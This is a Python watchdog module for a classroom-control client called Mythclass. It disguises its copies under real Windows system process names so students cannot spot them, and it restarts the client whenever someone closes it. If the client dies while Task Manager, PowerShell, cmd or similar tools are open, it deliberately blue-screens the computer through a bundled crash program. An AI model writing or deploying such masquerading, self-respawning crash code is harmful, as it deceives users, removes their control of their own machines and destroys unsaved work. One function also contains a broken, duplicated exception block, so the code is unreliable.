"""看门狗（两个副本，名字学系统进程）

主人要的：
  进程1  看着主进程在不在 —— 不在（更新 / 主动退出除外）就把它拉起来
  进程2  看着 PowerShell / 任务管理器 / 资源监视器 / cmd ——
         这些开着 **而且** 主进程没了（同样是更新/主动退出除外）→ 让电脑蓝屏

为什么用副本：进程名得像个系统进程，不能让学生一眼看出是 Mythclass。
所以把主程序复制成两个名字（WmiPrvSE.exe / RuntimeBroker.exe）放在同一个
目录里，用 --watch 参数跑。而主进程启动时会检查这两个在不在，缺了就拉起来。

⚠️ 安全阀：环境变量 MYTHCLASS_SAFE=1 时**绝不**执行蓝屏程序，只在日志里写
   "本该蓝屏"。所有测试都带这个变量，免得把测试机搞蓝屏。
"""

from __future__ import annotations

import os
import subprocess
import sys
import time
from pathlib import Path

# 进程名：都是 Windows 上真实存在的系统进程名（混在里面看不出来）
NAMES = {
    "main": "WmiPrvSE.exe",  # 看着主进程的那个
    "tools": "RuntimeBroker.exe",  # 看着 PowerShell/任务管理器 的那个
}

# 主人指定的蓝屏程序
BSOD_EXE = r"W:\Files\D\Files\Temps_临时\蓝屏\wbrn.exe"

# 学生可能拿来"关掉它"的东西
WATCH_TOOLS = (
    "powershell.exe",
    "pwsh.exe",
    "cmd.exe",
    "taskmgr.exe",
    "perfmon.exe",
    "resmon.exe",
    "procexp.exe",
    "procexp64.exe",
    "taskkill.exe",
    "regedit.exe",
    "mmc.exe",
)

POLL_SECONDS = 1.0  # 一秒看一遍：主人要的是「结束就蓝屏」，不能磨蹭
GRACE_SECONDS = 2.0  # 主进程一没就赶紧拉起来（主人说 25 秒太慢）；更新那会儿有标记挡着，不怕误拉
TOOLS_GRACE_SECONDS = 0.0  # 工具那条：主进程一没就立刻判断（主人要「立马蓝屏」）


def safe_mode() -> bool:
    return bool(os.environ.get("MYTHCLASS_SAFE"))


def _log(text: str) -> None:
    """看门狗自己写日志（不能依赖主进程那套 logging）"""
    try:
        base = Path(os.environ.get("APPDATA") or Path.home()) / "Mythclass"
        base.mkdir(parents=True, exist_ok=True)
        stamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(base / "watchdog.log", "a", encoding="utf-8") as fh:
            fh.write(f"{stamp} {text}\n")
    except Exception:
        pass


# ------------------------------ 进程副本 ------------------------------


def _install_dir() -> Path:
    return Path(sys.executable).parent


def _frozen() -> bool:
    return bool(getattr(sys, "frozen", False))


def copies() -> dict[str, Path]:
    """两个副本该在哪"""
    d = _install_dir()
    return {role: d / name for role, name in NAMES.items()}


def ensure_copies() -> dict[str, Path]:
    """把主程序复制成那两个名字（只有一个 exe 的打包版才做）"""
    made = copies()
    if not _frozen():
        return made  # 源码跑的时候没有 exe 可复制，直接在原进程上跑守护逻辑
    src = Path(sys.executable)
    for role, dst in made.items():
        try:
            # 独立副本：**必须是真的另一个文件**。
            # 用硬链接的话，任务管理器会把它们和主程序归成一组（同一个文件），
            # 老师点「结束任务」时整组一起被杀 —— 看门狗自己也死了，没人去蓝屏。
            need = True
            try:
                if dst.exists() and dst.stat().st_ino != src.stat().st_ino and dst.stat().st_size == src.stat().st_size:
                    need = False  # 已经是独立的、大小一致的副本
            except Exception:
                need = True
            if need:
                try:
                    if dst.exists():
                        dst.unlink()
                except Exception:
                    pass
                import shutil as _sh

                _sh.copy2(src, dst)
                _log(f"放好了看门狗副本：{dst.name}（独立文件，不会和主程序同组）")
        except Exception as err:
                # 硬链接不行（跨卷之类）就算了，退回复制 —— 但复制那份可能跑不起来，
                # 所以宁可没有副本，也不要弄坏什么。
                _log(f"建硬链接失败（{type(err).__name__}: {err}），这个看门狗先不放了")
                continue
        except Exception as err:
            _log(f"复制 {dst.name} 失败：{type(err).__name__}: {err}")
    return made


def _launch(role: str) -> bool:
    """拉起一个看门狗"""
    flags = 0
    for name in ("CREATE_NO_WINDOW", "DETACHED_PROCESS"):
        flags |= getattr(subprocess, name, 0)
    try:
        if _frozen():
            exe = copies()[role]
            if not exe.exists():
                return False
            subprocess.Popen([str(exe), "--watch", role], creationflags=flags, close_fds=True)
        else:
            # 源码模式：用 pythonw 跑同一个模块（进程名不好看，但只在开发时这样）
            exe = sys.executable.replace("python.exe", "pythonw.exe")
            if not Path(exe).exists():
                exe = sys.executable
            subprocess.Popen([exe, "-m", "mythclass", "--watch", role], creationflags=flags, close_fds=True)
        return True
    except Exception as err:
        _log(f"拉起 {role} 失败：{type(err).__name__}: {err}")
        return False


def _running(role: str) -> bool:
    """那个看门狗在不在跑（按命令行里的 --watch 角色认）"""
    try:
        import psutil

        for proc in psutil.process_iter(["name", "cmdline"]):
            try:
                cmd = " ".join(proc.info.get("cmdline") or [])
            except Exception:
                continue
            if "--watch" in cmd and role in cmd:
                return True
    except Exception:
        pass
    return False


def ensure() -> None:
    """主进程启动时叫一次：两个看门狗都得在"""
    if safe_mode():
        _log("安全模式：不拉起看门狗")
        return
    # 更新标记是会"赖着不走"的：装完更新后新的客户端不一定来得及清它，
    # 于是每次启动都以为"正在更新"→ 看门狗一个都不拉 → 之后怎么结束都不蓝屏。
    # 所以这里自己清一次：
    #   ① 版本已经追平（note 里的版本不比现在新）→ 更新早装完了，删掉
    #   ② 标记本身超过 60 秒 → 更新不可能还在跑（装一次就一两分钟），删掉
    try:
        import json as _json

        import mythclass as _pkg

        from . import updater as _up

        _cur = str(getattr(_pkg, "__version__", "") or "")

        marker = _up.pending_path()
        if marker.exists():
            version = ""
            try:
                version = str((_json.loads(marker.read_text(encoding="utf-8")) or {}).get("version") or "")
            except Exception:
                version = ""
            age = time.time() - marker.stat().st_mtime
            done = bool(version) and not _up.is_newer(version, _cur)
            if done or age > 60:
                marker.unlink()
                _log(f"清掉了过期的更新标记（版本 {version or '?'}，{int(age)} 秒前写的）")
    except Exception as err:
        _log(f"清更新标记失败：{type(err).__name__}: {err}")

    # 上一次"正常退出"留下的标记要清掉 —— 不然这里会以为"这次也是说好的"，
    # 两个看门狗一个都不拉，之后不管怎么结束都不会蓝屏（主人就卡在这儿）。
    try:
        from . import guard as _guard

        _guard.clear_stop()
    except Exception:
        pass

    # 正在更新的时候别拉：安装器马上要换掉整个安装目录，
    # 现在拉起来的那两个（用旧文件跑的）会找不到 PyInstaller 档案，
    # 弹一堆 "Could not load ... PKG archive"。新版本起来后会自己拉。
    planned, why = intentional_exit()
    if planned:
        _log(f"现在是「{why}」，先不拉看门狗")
        return
    ensure_copies()
    for role in NAMES:
        if not _running(role):
            if _launch(role):
                _log(f"拉起了看门狗 {role}（{NAMES[role]}）")


# ------------------------------ 主进程在不在 ------------------------------


def _pid_file() -> Path:
    base = Path(os.environ.get("APPDATA") or Path.home()) / "Mythclass"
    return base / "main.pid"


def write_pid() -> None:
    try:
        target = _pid_file()
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(str(os.getpid()), encoding="utf-8")
    except Exception:
        pass


def main_alive() -> bool:
    """主进程还活着吗（先看 pid 文件，再用 psutil 核对一次）"""
    try:
        pid = int(_pid_file().read_text(encoding="utf-8").strip() or 0)
    except Exception:
        return False
    if pid <= 0:
        return False
    try:
        import psutil

        proc = psutil.Process(pid)
        name = (proc.name() or "").lower()
        # 打包版叫 MythclassClient.exe；源码版是 python/pythonw
        return "mythclass" in name or "python" in name
    except Exception:
        return False


def intentional_exit(ignore_stop: bool = False) -> tuple[bool, str]:
    """这一次退出是不是"说好了的"（更新 / 主动退出）

    ignore_stop=True 时**不看**"主动退出"那个标记 —— 工具那条看门狗用这个：
    主人要的是"这些软件开着，程序一退出就蓝屏"，不管它是怎么退的。
    """
    from . import guard as guard_mod
    from . import updater as updater_mod

    try:
        marker = updater_mod.pending_path()
        if marker.exists():
            # 超过 30 分钟的更新标记算过期 —— 不然一次没清干净的标记
            # 会让看门狗永远以为"正在更新"，既不拉人也不蓝屏。
            age = time.time() - marker.stat().st_mtime
            if age < 1800:
                return True, "正在更新"
            _log(f"更新标记已经 {int(age / 60)} 分钟没动静了，当过期处理")
    except Exception:
        pass
    if ignore_stop:
        return False, ""
    try:
        if guard_mod.stop_requested():
            return True, "主动退出"
    except Exception:
        pass
    return False, ""


# ------------------------------ 蓝屏 ------------------------------


def tools_running() -> list[str]:
    hits: list[str] = []
    try:
        import psutil

        for proc in psutil.process_iter(["name"]):
            try:
                name = (proc.info.get("name") or "").lower()
            except Exception:
                continue
            if name in WATCH_TOOLS:
                hits.append(name)
    except Exception:
        pass
    return sorted(set(hits))


def bsod_path() -> Path:
    """蓝屏程序在哪。

    优先用**安装包里带的**那份 —— 不然教室那台没有 W: 盘就永远不触发。
    找不到才退回主人给的绝对路径。
    """
    cands = []
    meipass = getattr(sys, "_MEIPASS", "")
    if meipass:
        cands.append(Path(meipass) / "mythclass" / "assets" / "wbrn.exe")
    cands.append(_install_dir() / "mythclass" / "assets" / "wbrn.exe")
    cands.append(_install_dir() / "_internal" / "mythclass" / "assets" / "wbrn.exe")
    cands.append(Path(BSOD_EXE))
    for c in cands:
        try:
            if c.exists():
                return c
        except Exception:
            continue
    return Path(BSOD_EXE)


def _enable_shutdown_privilege() -> bool:
    """给自己开 SeShutdownPrivilege（能开就开，开不了不报错）"""
    try:
        import ctypes
        from ctypes import wintypes

        advapi = ctypes.windll.advapi32
        kernel = ctypes.windll.kernel32
        TOKEN_ADJUST_PRIVILEGES = 0x0020
        TOKEN_QUERY = 0x0008
        SE_PRIVILEGE_ENABLED = 0x00000002

        class LUID(ctypes.Structure):
            _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

        class LUID_AND_ATTRIBUTES(ctypes.Structure):
            _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]

        class TOKEN_PRIVILEGES(ctypes.Structure):
            _fields_ = [("PrivilegeCount", wintypes.DWORD),
                        ("Privileges", LUID_AND_ATTRIBUTES * 1)]

        token = wintypes.HANDLE()
        if not advapi.OpenProcessToken(kernel.GetCurrentProcess(),
                                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                        ctypes.byref(token)):
            return False
        luid = LUID()
        if not advapi.LookupPrivilegeValueW(None, "SeShutdownPrivilege", ctypes.byref(luid)):
            return False
        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
        return bool(advapi.AdjustTokenPrivileges(token, False, ctypes.byref(tp), 0, None, None))
    except Exception:
        return False


def _launch_like_double_click(exe: Path) -> str:
    """像手动双击那样把它拉起来，返回走了哪条路"""
    import ctypes

    # ① explorer.exe 代开 —— 和双击一模一样（资源管理器给它的令牌是干净的）
    try:
        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        subprocess.Popen(["explorer.exe", str(exe)], creationflags=flags, close_fds=True)
        time.sleep(2.5)
        return "explorer"
    except Exception as err:
        _log(f"explorer 代开失败：{type(err).__name__}: {err}")

    # ② 直接开（工作目录设成它自己那目录）
    try:
        subprocess.Popen([str(exe)], cwd=str(exe.parent), close_fds=True)
        time.sleep(2.5)
        return "direct"
    except Exception as err:
        _log(f"直接开失败：{type(err).__name__}: {err}")

    # ③ 以管理员身份重开（会弹 UAC，教室里没人点也没关系，前两条通常已经够了）
    try:
        rc = ctypes.windll.shell32.ShellExecuteW(None, "runas", str(exe), None,
                                                 str(exe.parent), 1)
        if rc > 32:
            time.sleep(2.5)
            return "runas"
        _log(f"runas 返回 {rc}")
    except Exception as err:
        _log(f"runas 失败：{type(err).__name__}: {err}")

    return ""


def trigger_bsod(why: str) -> bool:
    """让电脑蓝屏。安全模式下只记日志。

    那个工具用的是 RtlAdjustPrivilege + NtRaiseHardError（纯用户态）。
    这种手法失败是**完全静默**的 —— 所以要多试几种起法，
    并且每一步都写日志，不然根本查不出它到底动没动手。
    """
    exe = bsod_path()
    if safe_mode():
        _log(f"【安全模式】本该蓝屏（{why}），没执行 {exe}")
        return False
    if not exe.exists():
        _log(f"蓝屏程序不在（安装包里没有、{BSOD_EXE} 也没有）")
        return False

    try:
        import ctypes

        admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        admin = None
    priv = _enable_shutdown_privilege()
    _log(f"执行蓝屏程序：{exe}（管理员权限={admin}，SeShutdownPrivilege={priv}）")

    how = _launch_like_double_click(exe)
    if how:
        _log(f"用「{how}」方式起了蓝屏程序 —— 等 8 秒看机器蓝没蓝（没蓝的话日志里会有下一行）")
        time.sleep(8)
        _log(f"★ 8 秒过去机器还没蓝（方式={how}）—— 换个方式再试一次")
    else:
        _log("★ 三种方式都没能把它拉起来")

    # 换一条路再试一次（工具失败是静默的，多试一次没坏处）
    for second in ("direct", "explorer"):
        if second == how:
            continue
        try:
            if second == "direct":
                subprocess.Popen([str(exe)], cwd=str(exe.parent), close_fds=True)
            else:
                flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
                subprocess.Popen(["explorer.exe", str(exe)], creationflags=flags, close_fds=True)
            _log(f"换「{second}」方式又起了一次")
            time.sleep(8)
            _log(f"★ 换 {second} 之后还是没蓝")
        except Exception as err:
            _log(f"换 {second} 也失败：{type(err).__name__}: {err}")

    return False


def run(role: str) -> int:
    """看门狗本体。role = main | tools"""
    _log(f"看门狗启动：{role}（{NAMES.get(role, '?')}），安全模式={safe_mode()}")
    gone_since = 0.0
    seen_alive = False  # 必须**亲眼见过**主进程活着，之后的消失才算数

    while True:
        time.sleep(POLL_SECONDS)

        # 工具这条：**不看**"主动退出"标记 ——
        # 主人要的是"这些软件开着，程序一退出就蓝屏"，不管怎么退的。
        planned, why = intentional_exit(ignore_stop=(role == "tools"))
        if planned:
            _log("这次是说好的（" + why + "）—— 看门狗退出")
            return 0

        alive = main_alive()
        if alive:
            seen_alive = True
            # ⚠️ 只有 main 角色才清零。
            # tools 角色一旦开始计时就不许清 —— 否则 main 角色把客户端拉回来，
            # tools 一看"又活着"就把计时归零，永远等不到期满，也就永远不蓝屏。
            if role == "main":
                gone_since = 0.0
            continue

        if not seen_alive:
            # 没见过它活着（比如 pid 文件是上次留下的），不处理 ——
            # 不然刚开机、任务管理器正好开着，就会莫名其妙蓝屏。
            continue

        if not gone_since:
            gone_since = time.time()
        waited = time.time() - gone_since

        if role == "main":
            if waited < GRACE_SECONDS:
                continue
            _log("主进程不在了，拉起来")
            if _relaunch_main():
                gone_since = 0.0
                seen_alive = False  # 等它真的起来再重新算
                time.sleep(8)
            else:
                time.sleep(5)
        else:
            # 工具这条宽限期短一点：主进程没了 + 这些东西开着 = 有人想关掉它
            if waited < TOOLS_GRACE_SECONDS:
                continue
            hits = tools_running()
            if hits:
                _log("主进程没了，而且这些还开着：" + "、".join(hits))
                trigger_bsod("主进程没了，而且这些还开着：" + "、".join(hits))
                time.sleep(30)
                gone_since = 0.0
            else:
                # 没开那些东西：接着盯着，不清零 ——
                # 只要之后有人打开任务管理器，立刻算数
                pass


def _relaunch_main() -> bool:
    from . import guard as guard_mod

    try:
        if _frozen():
            cmd = [sys.executable]
        else:
            exe = sys.executable.replace("python.exe", "pythonw.exe")
            cmd = [exe if Path(exe).exists() else sys.executable, "-m", "mythclass"]
        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        guard_mod.clear_stop()
        subprocess.Popen(cmd, creationflags=flags, close_fds=True)
        return True
    except Exception as err:
        _log(f"拉起主进程失败：{type(err).__name__}: {err}")
        return False


def stop_all() -> int:
    """主动退出时：把两个看门狗一起请走（它们看到 stop 标记会自己退）"""
    from . import guard as guard_mod

    guard_mod.request_stop()
    killed = 0
    try:
        import psutil

        for proc in psutil.process_iter(["cmdline"]):
            try:
                cmd = " ".join(proc.info.get("cmdline") or [])
            except Exception:
                continue
            if "--watch" in cmd and "mythclass" in cmd.lower():
                proc.kill()
                killed += 1
    except Exception:
        pass
    return killed
